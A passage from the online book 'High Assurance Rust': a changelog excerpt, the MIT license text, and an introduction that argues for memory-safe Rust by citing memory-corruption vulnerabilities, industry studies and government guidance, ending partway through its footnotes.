<p><strong>v0.4.3-alpha:</strong></p>
<ul>
<li>New section: <em>14.4 Tactical Trust (1/2)</em></li>
<li>Community-submitted fixes, special thanks to <a href="https://github.com/pixelshot91">pixelshot91</a> for improving technical accuracy</li>
<li>Bump <code>mdbook</code> (v0.4.35 -&gt; v0.4.51), includes several rendering updates</li>
</ul>
</li>
<li>
<p><strong>v0.4.2-alpha:</strong></p>
<ul>
<li>Internal tools update (metrics, linter)</li>
<li>Landing/<code>README.md</code> badges with computed page and diagram counts</li>
<li>Updated EPUB download</li>
<li>Updated mentions of <a href="https://github.com/ferrocene/ferrocene">Ferrocene</a> and <a href="https://spec.ferrocene.dev/">FLS</a> in light of respective open-source releases (yay!)</li>
</ul>
</li>
<li>
<p><strong>v0.4.1-alpha:</strong></p>
<ul>
<li>New section: <em>4.2 Assurance Perspective: Stack Safety</em></li>
<li>New section: <em>16.10 Theory: Inter-procedural CFGs</em></li>
<li>Revisions to 4.0, 4.1, and 4.4.</li>
<li>Many new and revised 4.X diagrams.</li>
</ul>
</li>
<li>
<p><strong>v0.4.0-alpha:</strong></p>
<ul>
<li>New section: <em>4.1. Software Perspective: CPU to Stack</em></li>
<li>New section: <em>4.3. Attacker's Perspective: Breaking Safety (1/2)</em></li>
<li>New section: <em>4.4. Attacker's Perspective: Unifying Theory (2/2)</em></li>
</ul>
</li>
<li>
<p><strong>v0.3.2:</strong></p>
<ul>
<li><a href="https://foundation.rust-lang.org/">Rust Foundation</a> sponsorship via the <a href="https://foundation.rust-lang.org/news/2022-06-14-community-grants-program-awards-announcement/">2022 Project Grants Program</a>!</li>
<li>New diagrams and discussion in 1.1, 2.10.</li>
<li>New asides in 2.2 and 2.7.</li>
<li><a href="https://github.com/tnballo/high-assurance-rust/blob/main/CODE_OF_CONDUCT.md"><code>CODE_OF_CONDUCT.md</code></a> added.</li>
<li>EPUB download now includes a SHA-3-256 hash and timestamp.</li>
</ul>
</li>
<li>
<p><strong>v0.3.1:</strong></p>
<ul>
<li><a href="./chp1/about_the_team.html#community-contributors">Community Contributors list</a> started, <a href="https://github.com/tnballo/high-assurance-rust/blob/main/CONTRIBUTING.md"><code>CONTRIBUTING.md</code></a> added.</li>
<li>Several fixes and improvements based on community feedback.</li>
<li>Shout-out to <a href="https://www.jam1.re/">jam1garner</a> for a thorough review and deep technical insights.</li>
<li>Add EPUB download.</li>
</ul>
</li>
<li>
<p><strong>v0.3.0:</strong></p>
<ul>
<li>Hello, world! :)</li>
<li>Public release of initial content (Chapters 1, 2, 3, and most of Appendix).</li>
</ul>
</li>
<li>
<p><strong>v0.0.0:</strong></p>
<ul>
<li><a href="https://github.com/tnballo/scapegoat">Open-source <code>scapegoat</code> library</a> demonstrates that this book's core project is viable.</li>
<li>Maximizes Rust's major strengths: memory safety and bare metal portability.</li>
</ul>
</li>
</ul>
<blockquote>
<p>Dates intentionally omitted to keep us focused on quality, not speed. Except for the code - that's pretty fast (stack-stored arena, no recursion).</p>
</blockquote>
<hr />
<div style="break-before: page; page-break-before: always;"></div><meta name="title" content="High Assurance Rust">
<meta name="description" content="Developing Secure and Robust Software">
<meta property="og:title" content="High Assurance Rust">
<meta property="og:description" content="Developing Secure and Robust Software">
<meta property="og:type" content="article">
<meta property="og:url" content="https://highassurance.rs/">
<meta property="og:image" content="https://highassurance.rs/img/har_logo_social.png">
<meta name="twitter:title" content="High Assurance Rust">
<meta name="twitter:description" content="Developing Secure and Robust Software">
<meta name="twitter:url" content="https://highassurance.rs/">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://highassurance.rs/img/har_logo_social.png">
<h1 id="license"><a class="header" href="#license">License</a></h1>
<hr />
<h2 id="books-text"><a class="header" href="#books-text">Book's Text</a></h2>
<p>All text in this book is licensed under a <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/">Creative Commons Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)</a> license.</p>
<p><a rel="license" href="http://creativecommons.org/licenses/by-nc-nd/4.0/"><img alt="Creative Commons License" style="border-width:0" src="https://i.creativecommons.org/l/by-nc-nd/4.0/88x31.png" /></a></p>
<h2 id="books-code"><a class="header" href="#books-code">Book's Code</a></h2>
<p>All code in this book (and the <a href="https://github.com/tnballo/scapegoat">open-source library</a> it's based on) is licensed under the <a href="https://opensource.org/licenses/MIT">MIT License</a>.</p>
<pre><code class="language-ignore">MIT License

Copyright (c) 2022 Tiemoko Ballo, Moumine Ballo, Alex James

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
</code></pre>
<hr />
<div style="break-before: page; page-break-before: always;"></div><meta name="title" content="High Assurance Rust">
<meta name="description" content="Developing Secure and Robust Software">
<meta property="og:title" content="High Assurance Rust">
<meta property="og:description" content="Developing Secure and Robust Software">
<meta property="og:type" content="article">
<meta property="og:url" content="https://highassurance.rs/">
<meta property="og:image" content="https://highassurance.rs/img/har_logo_social.png">
<meta name="twitter:title" content="High Assurance Rust">
<meta name="twitter:description" content="Developing Secure and Robust Software">
<meta name="twitter:url" content="https://highassurance.rs/">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://highassurance.rs/img/har_logo_social.png">
<h1 id="introduction"><a class="header" href="#introduction">Introduction</a></h1>
<hr />
<p>In systems programming - the world you're about to enter - we've become complacent.
Maybe even complicit.</p>
<p>We've promised our customers reliable and secure software, but with an implicit caveat: <em>not</em> at the cost of performance.
And the fastest languages have traditionally been memory-unsafe.
By using them, we actively risk both general functional requirements and our most base defensive posture:</p>
<ul>
<li>
<p><strong>Reliability:</strong> Memory safety errors cause unpredictable crashes (e.g. "segmentation faults"), unreproducible errors (e.g. "data races"), and eventual outages (e.g. "memory leaks").</p>
</li>
<li>
<p><strong>Security:</strong> Those same memory errors might give an attacker the ability to read sensitive data (e.g. "steal secrets") or execute nearly arbitrary commands under the privileges of the victim program (e.g. "full control").</p>
</li>
</ul>
<p>Your program crashing or producing incorrect output is one thing.
Your machine joining a botnet is another<sup class="footnote-reference" id="fr-RustTrust-1"><a href="#footnote-RustTrust">1</a></sup>.
Memory-unsafe programs risk both outcomes, simultaneously.</p>
<p>These incredible risks are largely mitigated<sup class="footnote-reference" id="fr-AppLang-1"><a href="#footnote-AppLang">2</a></sup> in most modern "application languages", which use garbage collection and/or heavyweight runtimes (think Python, Java, or Go).
Yet there are key verticals - safety-critical systems, high-performance distributed infrastructure, various kinds of firmware, etc. - that continue to rely on C and C++<sup class="footnote-reference" id="fr-CStory-1"><a href="#footnote-CStory">3</a></sup>.</p>
<p>Despite re-inventing themselves over time and powering much of the world's most critical software, these two traditional "systems languages" remain leading suppliers of worst-case security vulnerabilities (e.g. Heartbleed<sup class="footnote-reference" id="fr-HBleed-1"><a href="#footnote-HBleed">4</a></sup>, Stagefright<sup class="footnote-reference" id="fr-StageFright-1"><a href="#footnote-StageFright">5</a></sup>, EternalBlue<sup class="footnote-reference" id="fr-EternalBlue-1"><a href="#footnote-EternalBlue">6</a></sup>, Dirty Pipe<sup class="footnote-reference" id="fr-DirtyPipe-1"><a href="#footnote-DirtyPipe">7</a></sup>, etc).
The memory corruption threat remains unabated.</p>
<p>Such is the cost of a multi-decade commitment to backwards compatibility.
We don't seek to disparage the giants whose shoulders we stand on.</p>
<p>Yet those shoulders bear an awful burden.
A seminal 2012 research paper<sup class="footnote-reference" id="fr-Sok:EWoM-1"><a href="#footnote-Sok:EWoM">8</a></sup>, aptly titled <em>"Systematization of Knowledge: Eternal War in Memory"</em>, chronicled 30 years of <em>failed</em> C and C++ memory protection schemes.
Every new defense has been undermined by a new bypass technique.</p>
<p>Fast forward to 2019.
A Microsoft study<sup class="footnote-reference" id="fr-MSBlue-1"><a href="#footnote-MSBlue">9</a></sup>, of all security issues in the company's products between 2004 and 2018, claims:</p>
<blockquote>
<p>~70% of the vulnerabilities addressed through a security update each year continue to be memory safety issues.</p>
</blockquote>
<p>That percentage accounts for engineer experience and software quality processes at Microsoft - a market-leading titan.
If you're already a C or C++ programmer, this is an uncomfortable truth.
Understandable:</p>
<ul>
<li>
<p>C was the <em>revolution</em>, it gave the world "high-level" programs portable across processors<sup class="footnote-reference" id="fr-AdvC-1"><a href="#footnote-AdvC">10</a></sup>. And today it runs, at some deep level, in nearly every device.</p>
</li>
<li>
<p>C++'s powerful abstractions enable performant systems of impressive scale: web browsers, graphics engines, databases, etc. Software we couldn't live without.</p>
</li>
</ul>
<p>But <em>evolution</em> may be overdue.
Google's 2022 analysis<sup class="footnote-reference" id="fr-ProjZero2021Review-1"><a href="#footnote-ProjZero2021Review">11</a></sup> of previously-unknown (e.g. "zero-day") exploits "detected and disclosed as used in-the-wild" found that:</p>
<blockquote>
<p>Out of the 58 in-the-wild 0-days for the year [2021], 39, or 67% were memory corruption vulnerabilities.
Memory corruption vulnerabilities have been the standard for attacking software for the last few decades and it's still how attackers are having success.</p>
</blockquote>
<p>Some of the exploits surveyed were actively used to target journalists, politicians, activists, and minority populations<sup class="footnote-reference" id="fr-ProjZero2021Review-2"><a href="#footnote-ProjZero2021Review">11</a></sup>.
Memory corruption is not a theoretical problem.
It's a pressing and severe issue that, in the worst case, has tangible human costs.</p>
<blockquote>
<p><strong>What if I'm just <em>really</em> careful, <em>all</em> the time?</strong></p>
<p>Best practices for modern C-family languages can reduce the <em>likelihood</em> of memory vulnerabilities.
But they can't seem to <em>eliminate</em> them.
And, unlike Rust's compile time errors and runtime checks, best practices are difficult to scale.</p>
<p>Decades of data indicate that developer diligence and extensive testing cannot reliably solve the memory safety problem.
It's time to seriously consider addressing the root cause.</p>
</blockquote>
<h2 id="we-dont-need-to-be-complacent-anymore"><a class="header" href="#we-dont-need-to-be-complacent-anymore">We Don't Need to Be Complacent Anymore</a></h2>
<p>Rust, as a relatively new systems language, supports what have traditionally been C/C++ domains.
It offers an alternative set of paradigms, namely compiler-enforced "ownership"<sup class="footnote-reference" id="fr-Lifetime-1"><a href="#footnote-Lifetime">12</a></sup>.</p>
<p>If you've never tried Rust, imagine pair programming alongside a nearly-omniscient but narrowly-focused perfectionist.
That's what the borrow checker, a compiler component implementing the ownership concept, can sometimes feel like.</p>
<p>In exchange for the associated learning curve, we get memory safety guarantees.
That means we can, often but not always, prove the <em>absence of all memory errors with certainty</em>.</p>
<p>Rust was announced by Mozilla in 2010<sup class="footnote-reference" id="fr-ProjServo-1"><a href="#footnote-ProjServo">13</a></sup>, is led by an independent non-profit as of 2021<sup class="footnote-reference" id="fr-RFound-1"><a href="#footnote-RFound">14</a></sup>, and largely solves the single most pressing security problem in the last 40 years of systems programming: memory safety.</p>
<p>It's arguably the first commercially viable programming language simultaneously offering both memory safety and bare metal speed.</p>
<h2 id="is-that-just-an-opinion"><a class="header" href="#is-that-just-an-opinion">Is that just an opinion?</a></h2>
<p>It's an opinion gaining formidable momentum.
Past some threshold of social acceptance and market pressures, it might even become a boring stance.
Here are similar takes from some of Rust's production users:<sup class="footnote-reference" id="fr-ProdUsers-1"><a href="#footnote-ProdUsers">15</a></sup></p>
<p>Amazon:<sup class="footnote-reference" id="fr-QuoteAmazon-1"><a href="#footnote-QuoteAmazon">16</a></sup></p>
<blockquote>
<p>...at AWS we increasingly build critical infrastructure like the Firecracker VMM using Rust because its out-of-the-box features reduce the time and effort needed to reach Amazon’s high security bar, while still delivering runtime performance similar to C and C++.</p>
</blockquote>
<p>Google:<sup class="footnote-reference" id="fr-QuoteGoogle-1"><a href="#footnote-QuoteGoogle">17</a></sup></p>
<blockquote>
<p>We feel that Rust is now ready to join C as a practical language for implementing the [Linux] kernel. It can help us reduce the number of potential bugs and security vulnerabilities in privileged code while playing nicely with the core kernel and preserving its performance characteristics.</p>
</blockquote>
<p>Microsoft:<sup class="footnote-reference" id="fr-QuoteMicrosoft-1"><a href="#footnote-QuoteMicrosoft">18</a></sup></p>
<blockquote>
<p>[Rust is] the industry's best chance for addressing this [memory safety] issue head-on.</p>
</blockquote>
<p>Moreover, Rust has begun to appear at the forefront of US government security guidance.
In the time since this section was originally published (March 2022), we've seen various government entities explicitly name Rust as a solution to the dire societal problem of memory safety:</p>
<p>National Security Agency (NSA):<sup class="footnote-reference" id="fr-QuoteNSA-1"><a href="#footnote-QuoteNSA">19</a></sup></p>
<blockquote>
<p>Software analysis tools can detect many instances of memory management issues and operating environment options can also provide some protection, but inherent protections offered by memory safe software languages can prevent or mitigate most memory management issues. NSA recommends using a memory safe language when possible.</p>
<p>...Examples of memory safe language include C#, Go, Java, Ruby, Rust, and Swift.</p>
</blockquote>
<p>Cybersecurity and Infrastructure Security Agency (CISA):<sup class="footnote-reference" id="fr-QuoteCISA-1"><a href="#footnote-QuoteCISA">20</a></sup></p>
<blockquote>
<p>In what other industry would the market tolerate such well-understood and severe dangers for users of products for decades?</p>
<p>...What has been lacking until a few years ago is a language with the speed of C/C++ with built-in memory safety assurances. In 2006, a software engineer at Mozilla began working on a new programming language called Rust. Rust version 1.0 was officially announced in 2015.</p>
</blockquote>
<p>National Institute of Standards and Technology (NIST):<sup class="footnote-reference" id="fr-QuoteNIST-1"><a href="#footnote-QuoteNIST">21</a></sup></p>
<blockquote>
<p>Safety or quality cannot be "tested into" programs. It must be designed in from the start. Choosing to implement with a safer or more secure language or language subset can entirely avoid whole classes of weaknesses.</p>
<p>...Rust has an ownership model that guarantees both memory safety and thread safety, at compile-time, without requiring a garbage collector. This allows users to write high-performance code while eliminating many bug classes. Though Rust does have an unsafe mode, its use is explicit, and only a narrow scope of actions is allowed.</p>
</blockquote>
<h2 id="does-that-mean-rust-programs-cant-be-compromised"><a class="header" href="#does-that-mean-rust-programs-cant-be-compromised">Does that mean Rust programs can't be compromised?</a></h2>
<p>Definitely not.
Memory corruption is just one bug class.
It's particularly vicious and is often part of high-value exploit chains<sup class="footnote-reference" id="fr-ZP2O-1"><a href="#footnote-ZP2O">22</a></sup>, but other bug classes exist.</p>
<p>Many, if not most, security issues are language-agnostic (e.g. misconfiguration<sup class="footnote-reference" id="fr-MisConfig-1"><a href="#footnote-MisConfig">23</a></sup>, command injection<sup class="footnote-reference" id="fr-Log4J-1"><a href="#footnote-Log4J">24</a></sup>, hardcoded secrets<sup class="footnote-reference" id="fr-GitLabVuln-1"><a href="#footnote-GitLabVuln">25</a></sup>, etc).
And memory-safe languages infrequently introduce their own issues (e.x. interpreter evaluation of untrusted input, aka "eval injection").
No programming language will make your code absolutely secure against all attacks.</p>
<br>
<p align="center">
  <figure>
  <img width="100%" src="chp1/bugs_venn.svg">
  <figcaption><center>Diagram not to scale: language-agnostic bugs are likely most prevalent, followed by memory-unsafety.</center></figcaption><br>
  </figure>
</p>
<p>Moreover, Rust has a dirty little secret.
Let's address it up front: sometimes it's necessary to use Rust's <code>unsafe</code> keyword, which allows potentially memory-unsafe behavior within a specific block of code.
The intention is for a human to carefully review the safety of actions the compiler can't automatically verify.
And only in a few key places, instead of the entire codebase.</p>
<p>We won't need to use <code>unsafe</code> <em>at all</em> in this book's core project!
You'll learn how to reframe problems in an idiomatic way to maximize Rust's guarantees.
That's a critical skill for getting tangible security value out of the language.</p>
<p>But, for your situational awareness and future endeavors, we'll:</p>
<ul>
<li>Cover <code>unsafe</code>'s usage and implications in detail.</li>
<li>Learn tools for auditing the safety of Rust applications.</li>
<li>Review a handful of real-world vulnerabilities in Rust software, as case studies.</li>
<li>Build Foreign Function Interface (FFI) bindings to call our Rust code from unsafe languages.</li>
</ul>
<p>Rust is a monumental leap forward in systems security, not a panacea.</p>
<h2 id="is-rust-going-to-replace-c-andor-c"><a class="header" href="#is-rust-going-to-replace-c-andor-c">Is Rust going to replace C and/or C++?</a></h2>
<p>C and C++ power some of the most widely used software in the modern world.
A vast number of C-family codebases have been around for multiple decades, and will march on for several more.
Because they provide time-tested solutions to important problems.</p>
<p>Professional systems programmers stand to benefit from experience in all three languages.
The C-family is not going away any time soon.
And Rust integrates with existing C/C++ code.
Without runtime overhead.</p>
<p>This is a Rust book, but you'll see several small snippets of C.
These will usually demonstrate subtle "undefined behavior" problems that all C programmers should be aware of.</p>
<p>We'll also write bindings for calling the library you build from C via a Foreign Function Interface (CFFI).
That's a prerequisite to integrating new Rust components into existing codebases written in another language.</p>
<blockquote>
<p><strong>The Curious Case of <code>curl</code></strong></p>
<p><code>curl</code><sup class="footnote-reference" id="fr-Curl-1"><a href="#footnote-Curl">26</a></sup>, a utility for transferring data with URLs that's been ubiquitous since 1998, is written in C.
Because the tool is so heavily relied upon, its security impacts much of what we consider "the internet"<sup class="footnote-reference" id="fr-MemSafeCurl-1"><a href="#footnote-MemSafeCurl">27</a></sup>.</p>
<p>As of 2020, <code>curl</code> has integrated Rust backends for HTTP and TLS (called via CFFI) to bolster security<sup class="footnote-reference" id="fr-MemSafeCurl-2"><a href="#footnote-MemSafeCurl">27</a></sup>.
Memory safe Rust code seamlessly integrates with the existing C code.
It's all one compiled binary, there's no performance penalty for cross-language interoperability.</p>
<p>Although the average end user can't tell the difference (and that's a good thing!), <code>curl</code> is now a safer, more reliable program<sup class="footnote-reference" id="fr-CurlCaveat-1"><a href="#footnote-CurlCaveat">28</a></sup>.</p>
</blockquote>
<h2 id="is-adopting-a-new-language-really-worth-the-effort"><a class="header" href="#is-adopting-a-new-language-really-worth-the-effort">Is adopting a new language really worth the effort?</a></h2>
<p>You've likely invested significant experience-hours in your language/toolchain/ecosystem of choice.
Even if much of your knowledge is transferable, is Rust worth the effort?</p>
<p>Not for every project.
Rust is a compelling choice when performance, reliability, and security are all mission-critical requirements.
At this intersection of polarized criteria, the barrier to justifiable confidence has traditionally been absurdly high.
We're talking "formal methods": machine-assisted proofs, model checking, symbolic execution, etc.
Approaches that, while valuable, face roadblocks to significant adoption in industry.</p>
<p>Now, Rust's guarantees are a small subset of what those verification approaches provide collectedly.
But Rust also avoids many of the associated practicality pitfalls.</p>
<p>Rust's compiler proves<sup class="footnote-reference" id="fr-TypeProof-1"><a href="#footnote-TypeProof">29</a></sup> a specific set of important properties almost automatically, enabling us to ship quickly.
On the surface, we get memory safety without sacrificing low-latency performance.
Dig deeper, and our advantage is really principled verification at the pace of commercial development.
We get [some] proofs at the speed of real-world code.</p>
<blockquote>
<p><strong>Isn't verification only for toy programs?</strong></p>
<p>Most formally-backed guarantees are restricted to research prototypes; they simply don't scale to large, multi-threaded codebases.
So formal methods have a bad rap with practicing software engineers - too much difficulty, not enough value.</p>
<p>By contrast, the Rust compiler was originally designed to harden components of Firefox's browser engine<sup class="footnote-reference" id="fr-ProjServo-2"><a href="#footnote-ProjServo">13</a></sup> - a multi-million line, highly parallel, commercial codebase.</p>
</blockquote>
<p>Now any tool, no matter how potentially beneficial, must be usable to see adoption and impact.</p>
<p>Despite an initial learning curve, Rust was voted the "most loved" programming language for the last 7 years in a row.
In StackOverflow's annual developer survey<sup class="footnote-reference" id="fr-StackSurvey1-1"><a href="#footnote-StackSurvey1">30</a></sup>, which had over 73,000 responses in 2022<sup class="footnote-reference" id="fr-StackSurvey2-1"><a href="#footnote-StackSurvey2">31</a></sup>.</p>
<h2 id="alright-so-can-i-learn-rust"><a class="header" href="#alright-so-can-i-learn-rust">Alright. So can I learn Rust?</a></h2>
<p>Imagine you chose to immigrate to a different country and learn to speak a new language.
It wouldn't be easy, but it might be worth it.
Our foray into high assurance programming in Rust will likewise be a challenging yet rewarding one.</p>
<p>Here's the beauty of learning something new: anyone can do it.
It takes a bit of time and the right resources, but if you stick with it long enough things will start to click.
This book will help you quickly tame the high learning curve of Rust, so we can all build systems software we can collectively rely on.</p>
<h2 id="learning-outcomes"><a class="header" href="#learning-outcomes">Learning Outcomes</a></h2>
<ul>
<li>Understand <em>what</em> this book covers and <em>why</em></li>
<li>Understand where this book fits within the Dreyfus Model of Skill Acquisition</li>
<li>Setup a development environment so you can start writing Rust</li>
</ul>
<hr>
<ol class="footnote-definition"><li id="footnote-RustTrust">
<p><a href="https://gankra.github.io/blah/thesis.pdf"><em>You Can't Spell Trust Without Rust</em></a>. Aria Desires (2015). This Master's thesis by one of the Rust standard library BTree authors is the source of this botnet analogy, and a general influence on this book. <a href="#fr-RustTrust-1">↩</a></p>
</li>
<li id="footnote-AppLang">
<p>"Largely" is a caveat here: Python can have data races, Go can have segmentation faults, etc. But garbage collected languages don't give attackers the same powerful exploitation primitives as C and C++ (more details coming in Chapter 4), so they don't carry the same risks. <a href="#fr-AppLang-1">↩</a></p>
</li>
<li id="footnote-CStory">
<p>You'd be right to argue that C and C++ have as little in common with each other as they do with their former selves. C++11<sup class="footnote-reference" id="fr-Cpp11-1"><a href="#footnote-Cpp11">32</a></sup> bears little resemblance to C++20<sup class="footnote-reference" id="fr-Cpp20-1"><a href="#footnote-Cpp20">33</a></sup>. In lieu of a skim: the official C++ language standard grew by 515 pages, almost 40%, from 1,308<sup class="footnote-reference" id="fr-Cpp11-2"><a href="#footnote-Cpp11">32</a></sup> to 1,823<sup class="footnote-reference" id="fr-Cpp20-2"><a href="#footnote-Cpp20">33</a></sup> in total. <a href="#fr-CStory-1">↩</a></p>
</li>
<li id="footnote-HBleed">
<p><a href="https://blog.getreu.net/projects/embedded-system-security-with-Rust/"><em>Embedded System Security with Rust: Case Study of Heartbleed</em></a>. Jens Getreu (2016). <a href="#fr-HBleed-1">↩</a></p>
</li>
<li id="footnote-StageFright">
<p><a href="https://www.blackhat.com/docs/us-15/materials/us-15-Drake-Stagefright-Scary-Code-In-The-Heart-Of-Android.pdf"><em>Stagefright: Scary Code in the Heart of Android</em></a>. Joshua Drake (2015) <a href="#fr-StageFright-1">↩</a></p>
</li>
<li id="footnote-EternalBlue">
<p><a href="https://www.sentinelone.com/blog/eternalblue-nsa-developed-exploit-just-wont-die/"><em>EternalBlue Exploit: What It Is And How It Works</em></a>. SentinelOne (2019). <a href="#fr-EternalBlue-1">↩</a></p>
</li>
<li id="footnote-DirtyPipe">
<p><a href="https://dirtypipe.cm4all.com/"><em>The Dirty Pipe Vulnerability</em></a>. Max Kellerman (2022). <a href="#fr-DirtyPipe-1">↩</a></p>
</li>
<li id="footnote-Sok:EWoM">
<p><a href="https://people.eecs.berkeley.edu/~dawnsong/papers/Oakland13-SoK-CR.pdf"><em>SoK: Eternal War in Memory</em></a>. Laszlo Szekeres, Mathias Payer, Tao Wei, Dawn Song (2012). <a href="#fr-Sok:EWoM-1">↩</a></p>
</li>
<li id="footnote-MSBlue">
<p><a href="https://github.com/Microsoft/MSRC-Security-Research/blob/master/presentations/2019_02_BlueHatIL/2019_01%20-%20BlueHatIL%20-%20Trends%2C%20challenge%2C%20and%20shifts%20in%20software%20vulnerability%20mitigation.pdf"><em>Trends, challenges, and strategic shifts in the software vulnerability mitigation landscape</em></a>. Mat Miller (2019) <a href="#fr-MSBlue-1">↩</a></p>
</li>
<li id="footnote-AdvC">
<p><a href="https://adventofcomputing.libsyn.com/episode-53-c-level-part-i"><em>Episode 53 - C Level, Part I</em></a>. Sean Haas (2021). As this podcast explains, C was not the first language to compile to assembly - it's a practical variant of the idea that gained widespread adoption. <a href="#fr-AdvC-1">↩</a></p>
</li>
<li id="footnote-ProjZero2021Review">
<p><a href="https://googleprojectzero.blogspot.com/2022/04/the-more-you-know-more-you-know-you.html"><em>The More You Know, The More You Know You Don't Know</em></a>. Maddie Stone, Google Project Zero (2022). <a href="#fr-ProjZero2021Review-1">↩</a> <a href="#fr-ProjZero2021Review-2">↩2</a></p>
</li>
<li id="footnote-Lifetime">
<p>Ownership isn't entirely new, similar concepts were pioneered by research languages. Lifetimes, a closely related concept, has existed in the C++ community for a while<sup class="footnote-reference" id="fr-LifetimeCpp-1"><a href="#footnote-LifetimeCpp">34</a></sup>. But Rust's novel ownership system <em>enforces</em> lifetime rules at compile time. In C++, lifetime assumptions can be violated at runtime if you're not careful. Bugs and vulnerabilities can ensue. Some people argue that Rust crystallizes certain C++ best practices in the compiler itself. <a href="#fr-Lifetime-1">↩</a></p>
</li>
<li id="footnote-ProjServo">
<p><a href="http://venge.net/graydon/talks/intro-talk-2.pdf"><em>Project Servo, Technology from the past come to save the future from itself</em></a>. Graydon Hoare (2010). <a href="#fr-ProjServo-1">↩</a> <a href="#fr-ProjServo-2">↩2</a></p>
</li>
<li id="footnote-RFound">
<p><a href="https://foundation.rust-lang.org/posts/2021-02-08-hello-world/"><em>Hello World!</em></a>. Ashley Williams (2021). <a href="#fr-RFound-1">↩</a></p>
</li>
<li id="footnote-ProdUsers">
<p><a href="https://www.rust-lang.org/production/users"><em>Production Users</em></a>. The Rust Team (Accessed 2022). <a href="#fr-ProdUsers-1">↩</a></p>
</li>
<li id="footnote-QuoteAmazon">
<p><a href="https://aws.amazon.com/blogs/opensource/why-aws-loves-rust-and-how-wed-like-to-help/"><em>Why AWS loves Rust, and how we’d like to help</em></a>. Matt Asay, Official AWS Open Source Blog (2020). <a href="#fr-QuoteAmazon-1">↩</a></p>
</li>
<li id="footnote-QuoteGoogle">
<p><a href="https://security.googleblog.com/2021/04/rust-in-linux-kernel.html"><em>Rust in the Linux kernel</em></a>. Wedson Almeida Filho, Official Google Security Blog (2021). <a href="#fr-QuoteGoogle-1">↩</a></p>
</li>
<li id="footnote-QuoteMicrosoft">
<p><a href="https://thenewstack.io/microsoft-rust-is-the-industrys-best-chance-at-safe-systems-programming/"><em>Microsoft: Rust Is the Industry’s ‘Best Chance’ at Safe Systems Programming</em></a>. Joab Jackson (2020). <a href="#fr-QuoteMicrosoft-1">↩</a></p>
</li>
<li id="footnote-QuoteNSA">
<p><a href="https://media.defense.gov/2022/Nov/10/2003112742/-1/-1/0/CSI_SOFTWARE_MEMORY_SAFETY.PDF"><em>Software Memory Safety</em></a>. NSA (2022). <a href="#fr-QuoteNSA-1">↩</a></p>
</li>
<li id="footnote-QuoteCISA">
<p><a href="https://www.cisa.gov/news-events/news/urgent-need-memory-safety-software-products"><em>The Urgent Need for Memory Safety in Software Products</em></a>. Bob Lord, CISA (2023). <a href="#fr-QuoteCISA-1">↩</a></p>
</li>
<li id="footnote-QuoteNIST">
<p><a href="https://www.nist.gov/itl/ssd/software-quality-group/safer-languages"><em>Safer Languages</em></a>. NIST (2023). <a href="#fr-QuoteNIST-1">↩</a></p>
</li>
<li id="footnote-ZP2O">
<p><a href="https://sector7.computest.nl/post/2021-08-zoom/"><em>Zoom RCE from Pwn2Own 2021</em></a>. Thijs Alkemade, Daan Keupe (2021). <a href="#fr-ZP2O-1">↩</a></p>
</li>
<li id="footnote-MisConfig">
<p><a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/"><em>A05:2021 – Security Misconfiguration</em></a>. OWASP (2021). <a href="#fr-MisConfig-1">↩</a></p>
</li>
<li id="footnote-Log4J">
<p><a href="https://www.cisa.gov/uscert/apache-log4j-vulnerability-guidance"><em>Apache Log4j Vulnerability Guidance</em></a>. CISA (2021). <a href="#fr-Log4J-1">↩</a></p>
</li>
<li id="footnote-GitLabVuln">
<p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-1162"><em>CVE-2022-1162</em></a>. National Vulnerability Database (2022). <a href="#fr-GitLabVuln-1">↩</a></p>
</li>
<li id="footnote-Curl">
<p><a href="https://curl.se/"><em>curl</em></a>. Daniel Stenberg (2021). <a href="#fr-Curl-1">↩</a></p>
</li>
<li id="footnote-MemSafeCurl">
<p><a href="https://www.abetterinternet.org/post/memory-safe-curl/"><em>Memory Safe ‘curl’ for a More Secure Internet</em></a>. Internet Security Research Group (2020). <a href="#fr-MemSafeCurl-1">↩</a> <a href="#fr-MemSafeCurl-2">↩2</a></p>
</li>
<li id="footnote-CurlCaveat">
<p>As of this writing, the Rust-enabled build of <code>curl</code> is not its default configuration. It's up to those building and distributing <code>curl</code> (e.g. OS distro maintainers) to choose build configurations suitable for the platforms and users they support. A reasonable arrangement worth noting! <a href="#fr-CurlCaveat-1">↩</a></p>
</li>
<li id="footnote-TypeProof">
<p><a href="https://www.eurekalert.org/news-releases/610682"><em>Computer Scientist proves safety claims of the programming language Rust</em></a>. Saarland University (2021). Note that formal verification of Rust is a research problem with both current successes and ongoing work. <a href="#fr-TypeProof-1">↩</a></p>
</li>
<li id="footnote-StackSurvey1">
<p><a href="https://survey.stackoverflow.co/2022/#technology-most-loved-dreaded-and-wanted">Technology: Most loved, dreaded, and wanted</a>. StackOverflow (2022). <a href="#fr-StackSurvey1-1">↩</a></p>
</li>
<li id="footnote-StackSurvey2">
<p><a href="https://survey.stackoverflow.co/2022/#methodology-participants">Methodology: Participants</a>. StackOverflow (2022). <a href="#fr-StackSurvey2-1">↩</a></p>
</li>
<li id="footnote-Cpp11">
